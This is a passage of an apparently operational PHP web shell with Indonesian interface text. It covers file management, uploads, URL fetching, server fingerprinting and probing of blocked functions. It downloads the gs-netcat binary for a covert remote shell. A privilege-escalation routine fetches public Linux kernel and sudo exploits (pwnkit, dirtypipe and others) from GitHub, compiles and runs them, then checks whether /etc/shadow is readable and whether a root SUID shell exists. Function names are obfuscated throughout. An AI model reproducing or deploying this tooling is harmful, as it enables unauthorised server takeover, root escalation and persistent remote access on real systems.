    $path   = isset($_POST['path']) ? $_POST['path'] : $cwd_real;
    $path_real = safe_real($path); if ($path_real === false) $path_real = $base;

    if ($action == 'save_file') {
        $file    = isset($_POST['file']) ? $_POST['file'] : '';
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        if ($file != '') {
            $f = F('fpu');
            if (@$f($file, $content) !== false) { $msg = 'File berhasil disimpan'; } else { $msg = 'Gagal simpan file'; }
        }
        $cwd_real = $path_real;
    }
    
    if ($action == 'rename') {
        $old = isset($_POST['old']) ? $_POST['old'] : '';
        $new = isset($_POST['new']) ? $_POST['new'] : '';
        if ($old != '' && $new != '') {
            $dest = dirname($old) . '/' . basename($new);
            if (@rename($old, $dest)) $msg = 'Berhasil rename'; else $msg = 'Gagal rename';
        }
        $cwd_real = $path_real;
    }
    if ($action == 'chmod') {
        $target = isset($_POST['target']) ? $_POST['target'] : '';
        $mode   = isset($_POST['mode']) ? $_POST['mode'] : '';
        if ($target != '' && $mode != '') {
            $m = octdec($mode);
            if (@chmod($target, $m)) $msg = 'CHMOD berhasil'; else $msg = 'CHMOD gagal';
        }
        $cwd_real = $path_real;
    }
    if ($action == 'new_file') {
        $name = isset($_POST['name']) ? $_POST['name'] : '';
        if ($name != '') {
            $target = $path_real . '/' . basename($name);
            if (!file_exists($target)) {
                $fp = @fopen($target, 'w');
                if ($fp) { fclose($fp); $msg = 'File baru berhasil dibuat'; } else { $msg = 'Gagal buat file'; }
            } else { $msg = 'File sudah ada'; }
        }
        $cwd_real = $path_real;
    }
    if ($action == 'new_folder') {
        $name = isset($_POST['name']) ? $_POST['name'] : '';
        if ($name != '') {
            $target = $path_real . '/' . basename($name);
            if (!file_exists($target)) {
                if (@mkdir($target, 0777)) $msg = 'Folder baru berhasil dibuat'; else $msg = 'Gagal buat folder';
            } else { $msg = 'Folder sudah ada'; }
        }
        $cwd_real = $path_real;
    }
    if ($action == 'upload') {
        if (isset($_FILES['upfile']) && isset($_FILES['upfile']['tmp_name'])) {
            $name = basename($_FILES['upfile']['name']);
            $tmp  = $_FILES['upfile']['tmp_name'];
            if ($name != '' && $tmp != '') {
                if (@move_uploaded_file($tmp, $path_real . '/' . $name)) { $msg = 'Upload berhasil'; } else { $msg = 'Upload gagal'; }
            } else { $msg = 'File upload kosong'; }
        }
        $cwd_real = $path_real;
    }
    if ($action == 'touch') {
        $target = isset($_POST['target']) ? $_POST['target'] : '';
        $custom_time = isset($_POST['touch_time']) ? trim($_POST['touch_time']) : '';
        
        if ($target != '' && @file_exists($target)) {
            $time = time();
            if ($custom_time !== '') {
                $parsed = strtotime($custom_time);
                if ($parsed !== false) $time = $parsed;
            }
            
            if (@touch($target, $time)) {
                $msg = 'Timestamp berhasil diupdate ke: ' . date('Y-m-d H:i:s', $time);
            } else {
                $msg = 'Gagal update timestamp (periksa permission).';
            }
        }
        $cwd_real = $path_real;
    }
    if ($action == 'zip_folder') {
        $target = isset($_POST['target']) ? $_POST['target'] : '';
        if ($target != '' && @is_dir($target) && class_exists('ZipArchive')) {
            $zip_name = basename($target) . '_' . date('Ymd_His') . '.zip';
            $tmp = sys_get_temp_dir() . '/' . $zip_name;
            $zip = new ZipArchive();
            if ($zip->open($tmp, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                $base_len = strlen($target) + 1;
                foreach ($files as $file) {
                    if (!$file->isDir()) {
                        $file_path = $file->getRealPath();
                        $relative_path = substr($file_path, $base_len);
                        $zip->addFile($file_path, $relative_path);
                    }
                }
                $zip->close();
                
                header('Content-Type: application/zip');
                header('Content-Disposition: attachment; filename="' . $zip_name . '"');
                header('Content-Length: ' . filesize($tmp));
                readfile($tmp);
                @unlink($tmp);
                exit;
            } else {
                $msg = 'Gagal buat file ZIP.';
            }
        } else {
            $msg = 'ZipArchive tidak tersedia atau target bukan folder.';
        }
        $cwd_real = $path_real;
    }
    if ($action == 'upload_url') {
        $url  = isset($_POST['url']) ? trim($_POST['url']) : '';
        $name = isset($_POST['urlname']) ? basename($_POST['urlname']) : '';
        if ($url === '' || $name === '') {
            $msg = 'URL atau nama file kosong';
        } else {
            $target = $path_real . '/' . $name;
            if (!preg_match('#^https?://#i', $url)) $url = 'http://' . $url;
            $blob   = false;
            $method = 'none';

            if ($blob === false && function_exists(F('cur'))) {
                $c_init = F('cur'); $c_set = F('cur_c'); $c_exec = F('cur_'); $c_close = F('cur_cl');
                $ch = @$c_init($url);
                if ($ch) {
                    @$c_set($ch, CURLOPT_RETURNTRANSFER, true);
                    @$c_set($ch, CURLOPT_FOLLOWLOCATION, true);
                    @$c_set($ch, CURLOPT_SSL_VERIFYPEER, false);
                    @$c_set($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    @$c_set($ch, CURLOPT_TIMEOUT, 60);
                    @$c_set($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
                    $r = @$c_exec($ch); $code = (int)@curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    @$c_close($ch);
                    if ($r !== false && $r !== '' && $code >= 200 && $code < 400) { $blob = $r; $method = 'curl_ext'; }
                }
            }
            if ($blob === false && @ini_get('allow_url_fopen')) {
                $scc = F('scc');
                $ctx = @$scc(array('http' => array('timeout' => 60, 'user_agent' => 'Mozilla/5.0', 'follow_location' => 1), 'ssl'  => array('verify_peer' => false, 'verify_peer_name' => false)));
                $f = F('fge'); $r = @$f($url, false, $ctx);
                if ($r !== false && $r !== '') { $blob = $r; $method = 'fopen'; }
            }
            if ($blob === false && function_exists(F('ex'))) {
                $e = F('ex');
                $tmp = $target . '.tmp_dl';
                @$e('curl -fsSL --max-time 60 -o ' . escapeshellarg($tmp) . ' ' . escapeshellarg($url) . ' 2>/dev/null', $o, $rc);
                if ($rc === 0 && @is_file($tmp) && @filesize($tmp) > 0) {
                    $f = F('fge'); $blob = @$f($tmp); @unlink($tmp); $method = 'curl_exec';
                }
            }
            if ($blob === false && function_exists(F('ex')) && which_bin('wget')) {
                $e = F('ex');
                $tmp = $target . '.tmp_dl';
                @$e('wget -q --timeout=60 --tries=2 --no-check-certificate -O ' . escapeshellarg($tmp) . ' ' . escapeshellarg($url) . ' 2>/dev/null', $o, $rc);
                if ($rc === 0 && @is_file($tmp) && @filesize($tmp) > 0) {
                    $f = F('fge'); $blob = @$f($tmp); @unlink($tmp); $method = 'wget_exec';
                }
            }
            if ($blob === false && function_exists(F('ex')) && which_bin('python3')) {
                $e = F('ex');
                $py = which_bin('python3');
                $tmp = $target . '.tmp_dl';
                $pyc = "import urllib.request,sys;urllib.request.urlretrieve(sys.argv[1],sys.argv[2])";
                @$e(escapeshellarg($py) . ' -c ' . escapeshellarg($pyc) . ' ' . escapeshellarg($url) . ' ' . escapeshellarg($tmp) . ' 2>/dev/null', $o, $rc);
                if ($rc === 0 && @is_file($tmp) && @filesize($tmp) > 0) {
                    $f = F('fge'); $blob = @$f($tmp); @unlink($tmp); $method = 'python_urllib';
                }
            }
            if ($blob === false && function_exists(F('ex')) && which_bin('perl')) {
                $e = F('ex');
                $tmp = $target . '.tmp_dl';
                $pc = 'use LWP::Simple; my $d = get($ARGV[0]); if ($d) { open(my $f, ">", $ARGV[1]); binmode $f; print $f $d; close $f; }';
                @$e('perl -e ' . escapeshellarg($pc) . ' ' . escapeshellarg($url) . ' ' . escapeshellarg($tmp) . ' 2>/dev/null', $o, $rc);
                if ($rc === 0 && @is_file($tmp) && @filesize($tmp) > 0) {
                    $f = F('fge'); $blob = @$f($tmp); @unlink($tmp); $method = 'perl_lwp';
                }
            }
            if ($blob === false && function_exists(F('fso'))) {
                $parts = parse_url($url);
                if ($parts && isset($parts['host'])) {
                    $host = $parts['host'];
                    $path = isset($parts['path']) ? $parts['path'] : '/';
                    if (isset($parts['query'])) $path .= '?' . $parts['query'];
                    $port = isset($parts['port']) ? (int)$parts['port'] : (($parts['scheme'] === 'https') ? 443 : 80);
                    $ssl  = ($parts['scheme'] === 'https');
                    $fso = F('fso');
                    $fp = @$fso(($ssl ? 'ssl://' : '') . $host, $port, $e, $es, 15);
                    if ($fp) {
                        $req = "GET $path HTTP/1.0\r\nHost: $host\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n";
                        @fwrite($fp, $req);
                        $raw = '';
                        while (!feof($fp)) $raw .= @fread($fp, 8192);
                        @fclose($fp);
                        $sep = strpos($raw, "\r\n\r\n");
                        if ($sep !== false) {
                            $body = substr($raw, $sep + 4);
                            if ($body !== '') { $blob = $body; $method = 'fsockopen'; }
                        }
                    }
                }
            }

            if ($blob === false) {
                $msg = 'Semua metode fetch gagal.';
            } else {
                $f = F('fpu');
                if (@$f($target, $blob) !== false) {
                    @chmod($target, 0644);
                    $msg = 'OK [' . h($method) . ']: ' . h($name) . ' (' . format_size(strlen($blob)) . ')';
                } else {
                    $msg = 'Fetch OK via [' . h($method) . '] tapi gagal tulis.';
                }
            }
        }
        $cwd_real = $path_real;
    }
}
$view = isset($_GET['view']) ? $_GET['view'] : '';
$edit = isset($_GET['edit']) ? $_GET['edit'] : '';
$server_software = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '-';
$server_name     = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '-';
$uname           = function_exists('php_uname') ? @php_uname() : '-';
$self_user       = function_exists('get_current_user') ? @get_current_user() : '-';
$server_software = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '-';
$server_name     = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '-';
$uname           = function_exists('php_uname') ? @php_uname() : '-';
$self_user       = function_exists('get_current_user') ? @get_current_user() : '-';
$open_basedir    = @ini_get('open_basedir');
$disabled_parts = array();
$df_ini_all = '';
if (function_exists('ini_get_all')) {
    $a_all = @ini_get_all(null, false);
    if (is_array($a_all) && isset($a_all['disable_functions'])) $df_ini_all = $a_all['disable_functions'];
}
$raw_sources = array(
    function_exists('ini_get') ? @ini_get('disable_functions') : '',
    function_exists('get_cfg_var') ? @get_cfg_var('disable_functions') : '',
    $df_ini_all,
);
foreach ($raw_sources as $src) {
    if (is_array($src)) $src = implode(',', $src);
    if ($src === false || $src === null) continue;
    $src = trim((string)$src);
    if ($src === '') continue;
    foreach (explode(',', $src) as $fn) {
        $fn = trim($fn);
        if ($fn === '') continue;
        $lower = strtolower($fn);
        if (in_array($lower, array('1','0','on','off','yes','no','true','false','none','null'), true)) continue;
        if (!preg_match('/^[a-zA-Z_][a-zA-Z0-9_]*$/', $fn)) continue;
        $disabled_parts[$fn] = true;
    }
}
if (function_exists('get_defined_functions')) {
    $all_fns = get_defined_functions();
    $probe_list = isset($all_fns['internal']) ? $all_fns['internal'] : array();
    foreach ($probe_list as $fn) {
        if (strpos($fn, '\\') !== false) continue;
        if (!function_exists($fn)) continue;
        if (!is_callable($fn)) {
            $disabled_parts[$fn] = true;
        }
    }
}

if (empty($disabled_parts)) {
    $disabled = 'none';
} else {
    $names = array_keys($disabled_parts);
    sort($names, SORT_NATURAL | SORT_FLAG_CASE);
    $disabled = implode(', ', $names);
}

$open_basedir = @ini_get('open_basedir');
$doc_root  = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '-';
$cwd_php   = @getcwd();
$ip_remote = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '-';
$ip_server = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '-';
$safe_mode = @ini_get('safe_mode');
$timezone  = @date_default_timezone_get();
$uptime    = @file_get_contents('/proc/uptime');
if ($uptime) { $u_arr = explode(' ', $uptime); $uptime = (int)$u_arr[0]; } else { $uptime = 0; }
$uptime_h  = $uptime ? floor($uptime/3600).'h '.floor(($uptime%3600)/60).'m' : '-';
$disk_free = function_exists('disk_free_space') ? @disk_free_space($cwd_real) : false;
$disk_total= function_exists('disk_total_space') ? @disk_total_space($cwd_real) : false;
$mem       = @file_get_contents('/proc/meminfo');
$mem_total = $mem_avail = 0;
if ($mem) {
    if (preg_match('/MemTotal:\s+(\d+)/', $mem, $m)) $mem_total = $m[1];
    if (preg_match('/MemAvailable:\s+(\d+)/', $mem, $m)) $mem_avail = $m[1];
}
$cpu = @file_get_contents('/proc/cpuinfo');
$cores = $cpu ? substr_count($cpu, 'processor') : 0;
$hostname = function_exists('gethostname') ? @gethostname() : '-';
$tab = isset($_GET['tab']) ? $_GET['tab'] : '';
if (!in_array($tab, array('shell','gs','cmd','info','upurl','domain','hunt','logs','mail','inject',''), true)) $tab = '';
$sh_dir = __DIR__ . '/.rct_shell'; $sh_pid = "$sh_dir/pid.txt"; $sh_log = "$sh_dir/out.log"; $sh_err = "$sh_dir/err.log";
$gs_dir    = __DIR__ . '/.rct_gsocket'; $gs_pid    = "$gs_dir/pid.txt"; $gs_log    = "$gs_dir/out.log"; $gs_secret = "$gs_dir/secret.txt"; $gs_bin    = "$gs_dir/gs-netcat";
function gs_bin_path() { global $gs_bin; return $gs_bin; }
function gs_present() { return @is_file(gs_bin_path()) && @is_executable(gs_bin_path()); }
function gs_arch() {
    $u = @php_uname('m');
    if (stripos($u, 'x86_64') !== false || stripos($u, 'amd64') !== false) return 'linux-x86_64';
    if (stripos($u, 'aarch64') !== false || stripos($u, 'arm64') !== false) return 'linux-aarch64';
    return null;
}
function gs_download_bin() {
    global $gs_bin; if (gs_present()) return true; $arch = gs_arch(); if (!$arch) return false;
    $urls = array("https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_$arch");
    $blob = null;
    foreach ($urls as $u) {
        if (function_exists(F('cur'))) {
            $c_init = F('cur'); $c_set = F('cur_c'); $c_exec = F('cur_'); $c_close = F('cur_cl');
            $ch = @$c_init($u);
            if ($ch) {
                @$c_set($ch, CURLOPT_RETURNTRANSFER, true); @$c_set($ch, CURLOPT_FOLLOWLOCATION, true);
                @$c_set($ch, CURLOPT_SSL_VERIFYPEER, false); @$c_set($ch, CURLOPT_SSL_VERIFYHOST, 0);
                @$c_set($ch, CURLOPT_TIMEOUT, 30); @$c_set($ch, CURLOPT_USERAGENT, 'curl/7.68');
                $b = @$c_exec($ch); @$c_close($ch);
                if ($b && strlen($b) > 100000) { $blob = $b; break; }
            }
        }
    }
    if (!$blob) return false;
    $f = F('fpu'); @$f($gs_bin, $blob); @chmod($gs_bin, 0755); return gs_present();
}
function gs_get_secret() {
    global $gs_secret;
    if (@is_file($gs_secret)) { $s = trim(@file_get_contents($gs_secret)); if ($s !== '') return $s; }
    if (!@is_dir(dirname($gs_secret))) return '';
    $s = bin2hex(random_bytes(32)); @file_put_contents($gs_secret, $s); @chmod($gs_secret, 0600); return $s;
}

$sh_msg = '';
$tab_ext = isset($_GET['tab']) ? $_GET['tab'] : '';
$privesc_msg = '';
$batch_msg = '';

if (!function_exists('fn_ok')) {
    function fn_ok($f) {
        global $disabled_parts;
        if (!function_exists($f)) return false;
        if (isset($disabled_parts[$f])) return false;
        return is_callable($f);
    }
}
$crit = array(
    'exec'      => fn_ok(F('ex')),
    'shell_exec'=> fn_ok(F('she')),
    'system'    => fn_ok(F('sys')),
    'passthru'  => fn_ok(F('pas')),
    'popen'     => fn_ok(F('pop')),
    'proc_open' => fn_ok(F('pro')),
    'curl'      => function_exists(F('cur')),
    'wget'      => (bool)which_bin('wget'),
    'nc'        => (bool)which_bin('nc'),
    'python3'   => (bool)which_bin('python3'),
    'perl'      => (bool)which_bin('perl'),
    'gcc'       => (bool)which_bin('gcc'),
);
foreach (array('pcntl_exec','expect_popen','putenv','dl','mail','imap_open','mysqli_connect','fsockopen','symlink','link','chmod','copy','rename','tmpfile','glob') as $__cfn) {
    $crit[$__cfn] = fn_ok($__cfn);
}
foreach (array('bash','sh','dash','busybox','ncat','socat','python','ruby','node','php','make','nasm','git','tar','zip','unzip','openssl','base64','crontab','systemctl','docker','mysql','psql','redis-cli','nmap','tcpdump','grep','find') as $__cbin) {
    $crit[$__cbin] = (bool)which_bin($__cbin);
}

if (isset($_POST['batch_action']) && $_POST['batch_action'] !== '') {
    $ids = isset($_POST['batch_files']) ? (array)$_POST['batch_files'] : array();
    $op  = (string)$_POST['batch_action'];
    $cnt = 0;

    // Kalau ZIP, langsung proses dan exit — jangan lanjut ke delete
    if ($op === 'zip') {
        if (empty($ids)) {
            $batch_msg = 'Tidak ada file yang dipilih.';
        } else {
            $tmp = sys_get_temp_dir() . '/zip_' . bin2hex(random_bytes(6)) . '.zip';
            if (class_exists('ZipArchive')) {
                $zip = new ZipArchive();
                if ($zip->open($tmp, ZipArchive::CREATE) === TRUE) {
                    foreach ($ids as $fname) {
                        $full = $cwd_real . '/' . basename($fname);
                        if (is_file($full)) $zip->addFile($full, basename($full));
                    }
                    $zip->close();
                    header('Content-Type: application/zip');
                    header('Content-Disposition: attachment; filename="batch_' . date('Ymd_His') . '.zip"');
                    header('Content-Length: ' . filesize($tmp));
                    readfile($tmp);
                    @unlink($tmp);
                    exit;
                }
            } else {
                $batch_msg = 'ZipArchive tidak tersedia.';
            }
        }
    }
    // Kalau delete atau chmod, jalanin operasinya
    elseif ($op === 'delete' || $op === 'chmod') {
        if (empty($ids)) {
            $batch_msg = 'Tidak ada file yang dipilih.';
        } else {
            foreach ($ids as $fname) {
                $full = $cwd_real . '/' . basename($fname);
                if (!file_exists($full)) continue;
                if ($op === 'delete') {
                    if (is_dir($full)) {
                        if (delete_directory($full)) $cnt++;
                    } else {
                        if (@unlink($full)) $cnt++;
                    }
                } elseif ($op === 'chmod') {
                    $mode = isset($_POST['batch_mode']) ? octdec($_POST['batch_mode']) : 0644;
                    if (@chmod($full, $mode)) $cnt++;
                }
            }
            $batch_msg = "Batch $op: $cnt file berhasil diproses.";
        }
    } else {
        $batch_msg = 'Operasi tidak dikenali: ' . h($op);
    }
}


if (isset($_POST['kill_process'])) {
    $pid = (int)$_POST['kill_process'];
    if ($pid > 1) {
        $f = F('ex');
        $owner_out = array();
        @$f('ps -o user= -p ' . $pid . ' 2>/dev/null', $owner_out);
        $owner = trim(implode('', $owner_out));
        $current_user = function_exists('get_current_user') ? get_current_user() : 'www-data';
        @$f('kill -9 ' . $pid . ' 2>/dev/null', $o, $rc);
        if ($rc === 0) {
            $batch_msg = "PID $pid ($owner) berhasil dibunuh.";
        } else {
            $batch_msg = "Gagal kill PID $pid ($owner). Kemungkinan bukan milik $current_user. Coba dapet root dulu via tab Privesc.";
        }
    }
}
if (isset($_POST['privesc_action'])) {
    $cve = $_POST['privesc_action'];
    $exec_call = null;
    foreach (array(F('ex'), F('she'), F('sys'), F('pas')) as $cand) {
        if (function_exists($cand) && is_callable($cand)) { $exec_call = $cand; break; }
    }
    $pop_call = function_exists(F('pop')) && is_callable(F('pop')) ? F('pop') : null;

    if ($exec_call === null && $pop_call === null) {
        $privesc_msg = 'Tidak ada primitive exec yang tersedia (exec/shell_exec/system/passthru/popen semua diblokir). Privesc via PHP tidak mungkin di box ini.';
    } else {
        $tmp_dir = null;
        foreach (array(
            @sys_get_temp_dir(),
            '/tmp',
            '/var/tmp',
            '/dev/shm',
            __DIR__,
        ) as $cand) {
            if (!$cand) continue;
            $try = rtrim($cand, '/') . '/.prv_' . bin2hex(random_bytes(4));
            if (@mkdir($try, 0777, true)) { $tmp_dir = $try; break; }
        }

        if ($tmp_dir === null) {
            $privesc_msg = 'Tidak ada direktori writable untuk compile. open_basedir atau permission blok semua kandidat (/tmp, /var/tmp, /dev/shm, script dir).';
        } else {
            $f_fge  = F('fge');
            $f_fpu  = F('fpu');
            $run_cmd = function($cmd) use ($exec_call, $pop_call) {
                $out = array(); $rc = 0;
                if ($exec_call !== null) {
                    @call_user_func($exec_call, $cmd, $out, $rc);
                    if (!is_array($out)) $out = array((string)$out);
                    return array($out, (int)$rc);
                }
                if ($pop_call !== null) {
                    $h = @call_user_func($pop_call, $cmd);
                    if ($h) {
                        while (($line = @fgets($h)) !== false) $out[] = rtrim($line, "\r\n");
                        $rc = (int)@pclose($h);
                    }
                    return array($out, $rc);
                }
                return array(array('no exec primitive'), -1);
            };
            $dl = function($url, $dest) use ($f_fge, $f_fpu, $run_cmd) {
                if (function_exists(F('cur'))) {
                    $ci = F('cur'); $cs = F('cur_c'); $ce = F('cur_'); $cc = F('cur_cl');
                    $ch = @$ci($url);
                    if ($ch) {
                        @$cs($ch, CURLOPT_RETURNTRANSFER, true);
                        @$cs($ch, CURLOPT_FOLLOWLOCATION, true);
                        @$cs($ch, CURLOPT_SSL_VERIFYPEER, false);
                        @$cs($ch, CURLOPT_SSL_VERIFYHOST, 0);
                        @$cs($ch, CURLOPT_TIMEOUT, 30);
                        @$cs($ch, CURLOPT_USERAGENT, 'curl/7.88');
                        $b = @$ce($ch); $code = (int)@curl_getinfo($ch, CURLINFO_HTTP_CODE); @$cc($ch);
                        if ($b !== false && $b !== '' && $code >= 200 && $code < 400) {
                            @$f_fpu($dest, $b);
                            return @is_file($dest) && @filesize($dest) > 0;
                        }
                    }
                }
                if (@ini_get('allow_url_fopen')) {
                    $b = @$f_fge($url);
                    if ($b !== false && $b !== '') {
                        @$f_fpu($dest, $b);
                        return @is_file($dest) && @filesize($dest) > 0;
                    }
                }
                foreach (array(
                    'curl -fsSL --max-time 30 -k -o ' . escapeshellarg($dest) . ' ' . escapeshellarg($url),
                    'wget -q --timeout=30 --tries=2 --no-check-certificate -O ' . escapeshellarg($dest) . ' ' . escapeshellarg($url),
                ) as $c) {
                    $run_cmd($c . ' 2>/dev/null');
                    if (@is_file($dest) && @filesize($dest) > 0) return true;
                }
                return false;
            };
            $sources = array(
                'copyfail' => array(
                    'url'  => 'https://raw.githubusercontent.com/g1nt0n1x/copy-fail-CVE-2026-31431-shell/main/copy_fail_exp.sh',
                    'bin'  => 'copy_fail_exp.sh',
                    'type' => 'shell',
                ),
                'dirtyfrag' => array(
                    'url'  => 'https://raw.githubusercontent.com/V4bel/dirtyfrag/refs/heads/master/exp.c',
                    'bin'  => 'dirtyfrag',
                    'type' => 'c',
                ),
                'cowbug' => array(
                    'url'  => 'https://raw.githubusercontent.com/ashrafzaryouh/CVE-2026-46331/refs/heads/main/CVE-2026-46331.c',
                    'bin'  => 'cowbug',
                    'type' => 'c',
                ),
                'fragnesia' => array(
                    'url'  => 'https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/CVE-2026-46300/cve-2026-46300.c',
                    'bin'  => 'cve-2026-46300',
                    'type' => 'c',
                ),
                'pack2root' => array(
                    'url'  => 'https://raw.githubusercontent.com/dinosn/pack2theroot-lab/main/exploit/src/cve-2026-41651.c',
                    'bin'  => 'cve-2026-41651',
                    'type' => 'c',
                    'extra' => array(
                        'https://raw.githubusercontent.com/dinosn/pack2theroot-lab/main/exploit/Makefile',
                    ),
                ),
                'sudo_chroot' => array(
                    'url'  => 'https://raw.githubusercontent.com/Fomovet/cve-2025-32463/main/chwoot-demo.c',
                    'bin'  => 'chwoot',
                    'type' => 'c',
                ),
                'sudo_host' => array(
                    'url'  => 'https://raw.githubusercontent.com/0p5cur/CVE-2025-32462-POC/main/CVE-2025-32462.sh',
                    'bin'  => 'CVE-2025-32462.sh',
                    'type' => 'shell',
                ),
                'nftables' => array(
                    'url'  => 'https://raw.githubusercontent.com/LLfam/CVE-2024-1086/refs/heads/main/exp.c',
                    'bin'  => 'exploit',
                    'type' => 'c',
                ),
                'dirtypipe' => array(
                    'url'  => 'https://raw.githubusercontent.com/byteReaper77/Dirty-Pipe/main/dirtypipe.c',
                    'bin'  => 'dirtypipe',
                    'type' => 'c',
                ),
                'pwnkit' => array(
                    'url'  => 'https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c',
                    'bin'  => 'cve-2021-4034',
                    'type' => 'c',
                    'extra' => array(
                        'https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/pwnkit.c',
                        'https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/Makefile',
                    ),
                ),
                'baron_samedit' => array(
                    'url'  => 'https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/sudo-hax-me-a-sandwich.c',
                    'bin'  => 'sudo-hax',
                    'type' => 'c',
                ),
                'pedit_cow' => array(
                    'url'  => 'https://raw.githubusercontent.com/yanxinwu946/CVE-2026-46331/main/packet_edit_meme.c',
                    'bin'  => 'packet_edit_meme',
                    'type' => 'c',
                ),
                'overlayfs' => array(
                    'url'  => 'https://raw.githubusercontent.com/Sornphut/OverlayFS---CVE-2021-3493/refs/heads/main/exploit.c',
                    'bin'  => 'overlayfs',
                    'type' => 'c',
                ),
            );

            if (!isset($sources[$cve])) {
                $privesc_msg = 'CVE tidak dikenali: ' . h($cve);
            } else {
                $src = $sources[$cve];
                $main_file = $tmp_dir . '/' . $src['bin'];
                if (!$dl($src['url'], $main_file)) {
                    $privesc_msg =
                        'Download source gagal: <code>' . h($src['url']) . '</code><br>' .
                        'Kemungkinan: repo dihapus / CVE belum ada PoC publik, koneksi outbound diblokir, atau DNS mati.';
                } else {
                    if (isset($src['extra'])) {
                        foreach ($src['extra'] as $extra_url) {
                            $fname = basename(parse_url($extra_url, PHP_URL_PATH));
                            $dl($extra_url, $tmp_dir . '/' . $fname);
                        }
                    }
                    $compile_ok = false;
                    $compile_log = '';
                    if ($src['type'] === 'c') {
                        if (@is_file($tmp_dir . '/Makefile')) {
                            list($out, $rc) = $run_cmd('cd ' . escapeshellarg($tmp_dir) . ' && make 2>&1');
                            $compile_log .= "make:\n" . implode("\n", $out) . "\n";
                            if ($rc === 0) {
                                $compile_ok = true;
                                foreach (array($src['bin'], 'pwnkit', 'cve-2021-4034') as $cand) {
                                    if (@is_file($tmp_dir . '/' . $cand) && @is_executable($tmp_dir . '/' . $cand)) {
                                        $src['bin'] = $cand;
                                        break;
                                    }
                                }
                            }
                        }
                        if (!$compile_ok) {
                            list($out, $rc) = $run_cmd(
                                'cd ' . escapeshellarg($tmp_dir) .
                                ' && gcc -O2 -static -w ' . escapeshellarg($src['bin']) .
                                ' -o ' . escapeshellarg($src['bin']) . ' 2>&1'
                            );
                            $compile_log .= "gcc -static:\n" . implode("\n", $out) . "\n";
                            if ($rc === 0) $compile_ok = true;
                        }
                        if (!$compile_ok) {
                            list($out, $rc) = $run_cmd(
                                'cd ' . escapeshellarg($tmp_dir) .
                                ' && gcc -O2 -w ' . escapeshellarg($src['bin']) .
                                ' -o ' . escapeshellarg($src['bin']) . ' 2>&1'
                            );
                            $compile_log .= "gcc (dynamic):\n" . implode("\n", $out) . "\n";
                            if ($rc === 0) $compile_ok = true;
                        }
                    } elseif ($src['type'] === 'shell') {
                        @chmod($main_file, 0755);
                        $compile_ok = @is_file($main_file);
                        $compile_log = 'shell script, no compile';
                    } elseif ($src['type'] === 'asm') {
                        list($out, $rc) = $run_cmd(
                            'cd ' . escapeshellarg($tmp_dir) .
                            ' && nasm -f elf64 ' . escapeshellarg($src['bin']) . '.asm -o out.o' .
                            ' && gcc -static out.o -o ' . escapeshellarg($src['bin']) . ' 2>&1'
                        );
                        $compile_log .= "nasm+gcc:\n" . implode("\n", $out) . "\n";
                        if ($rc === 0) $compile_ok = true;
                    }

                    if (!$compile_ok) {
                        $privesc_msg =
                            'Compile gagal. Butuh <code>gcc</code> (atau <code>make</code>/<code>nasm</code>) di server.<br>' .
                            'Cek: <code>which gcc make nasm</code>. Kalau kosong, upload binary dari luar.<br>' .
                            '<pre style="max-height:300px;overflow:auto;">' . h($compile_log) . '</pre>';
                    } else {
                        $bin_path = $tmp_dir . '/' . $src['bin'];
                        @chmod($bin_path, 0755);
                        $shadow_before = @is_readable('/etc/shadow');
                        list($run_out, $run_rc) = $run_cmd(
                            'cd ' . escapeshellarg($tmp_dir) . ' && timeout 30 ./' . escapeshellarg($src['bin']) . ' 2>&1; echo "[rc=$?]"'
                        );
                        sleep(1);
                        $shadow_after = @is_readable('/etc/shadow');
                        $suid_candidates = array('/tmp/sh', '/tmp/.x', '/tmp/rootshell', '/tmp/.r', '/tmp/pwned');
                        $found_suid = '';
                        foreach ($suid_candidates as $cand) {
                            if (@is_file($cand) && @is_executable($cand)) {
                                $stat = @stat($cand);
                                if ($stat && ($stat['uid'] === 0)) { $found_suid = $cand; break; }
                            }
                        }

                        if ($shadow_before) {
                            $privesc_msg = '<div style="background:#1f3527;border:1px solid #355d42;color:#7ee787;padding:8px;border-radius:6px;margin-bottom:8px;">'
                                . '<b>Kamu sudah root sebelum exploit.</b> File manager ini sudah bisa baca /etc/shadow.</div>';
                        } elseif ($shadow_after || $found_suid !== '') {
                            $root_marker = $found_suid !== '' ? ' (found SUID binary: <code>' . h($found_suid) . '</code>)' : '';
                            $root_msg = '<div style="background:#1f3527;border:1px solid #355d42;color:#7ee787;padding:8px;border-radius:6px;margin-bottom:8px;">'
                                . '<b>PRIVESC BERHASIL</b> — /etc/shadow sekarang readable' . $root_marker . '.<br>'
                                . 'Sekarang kamu root di disk, tapi <i>shell PHP ini tetap www-data</i>. Spawn root shell di bawah untuk akses interaktif.</div>';
                            $spawn_options = '';
                            if ($found_suid !== '') {
                                $spawn_options .= '<div style="margin-top:10px;"><b>Metode 1: SUID binary ditemukan</b><br>'
                                    . 'Jalankan dari tab Shell / Command Execution:<br>'
                                    . '<code>' . h($found_suid) . ' -p</code> &nbsp;— atau &nbsp; <code>' . h($found_suid) . '</code> (jika binary Anda berisi reverse-shell hardcoded)</div>';
                            }
                            $writable_docroot = @is_writable(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '');
